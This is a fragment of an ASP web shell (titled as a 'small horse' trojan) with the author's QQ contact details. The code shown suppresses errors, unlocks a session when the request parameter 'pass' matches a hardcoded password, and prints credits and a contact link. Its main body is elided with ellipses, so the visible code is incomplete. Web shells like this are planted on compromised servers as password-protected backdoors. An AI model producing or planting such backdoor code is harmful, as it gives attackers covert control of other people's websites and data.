...
<title>→【曾经】←专用ASP小马   by: →【曾经】← QQ:243770567" </title>

<%
on error resume next
%>
<%
  if request("pass")="hkmm" then  '在这修改密码
  session("pw")="go"
  end if
%>
...
<%="</form>"%>
<%="<font face='黑体' color='red'> write by EchoEye QQ:261658804 </font>"%>
<%="<a href='tencent://message/?uin=243770567'>联系我</a>"%>
<%end if%></body></html>
